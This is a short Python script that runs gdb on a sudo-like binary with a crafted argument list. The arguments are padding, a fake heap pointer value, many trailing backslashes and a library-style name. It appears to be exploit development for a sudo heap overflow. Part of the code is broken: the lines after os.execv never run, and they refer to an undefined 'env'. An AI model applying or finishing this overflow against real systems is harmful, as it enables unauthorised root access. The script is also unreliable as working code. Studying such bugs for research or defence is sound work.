import json
import subprocess
import sys
import os

NEXT = "22223333"
#LIBRARY = "00001111"
#KNOWN = "AAAABBBB"
NAME = "XXXX/liveoverflow"

arg = [
    "I"*49+"="+"A"*93+NEXT+"aaanaaaaaaaoaaaaaaapaaaa\\",
    "\\","\\","\\","\\","\\","\\","\\","\\", # LIBRARY
    "\\","\\","\\","\\","\\","\\","\\", # KNOWN
    NAME
]

args = ["/usr/bin/gdb"]
args += ["-ex", "unset environment"]
args += ["-ex", "set breakpoint pending on"]
args += ["-ex", "break set_cmnd"]
args += ["-ex", "break set_cmnd"]
args += ["-ex", "r "+" ".join([f"'{a}'" for a in arg])]

args += ["/pwd/sudoenv"]

os.execv("/usr/bin/gdb", args)
p = subprocess.Popen(args, env=env, bufsize=0,
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
try:
    lines = p.communicate(b"quit\nquit\nquit\nquit\n",timeout=1)
    print(lines[0].decode('utf-8'))
except subprocess.TimeoutExpired:
    p.terminate()
    pass
input()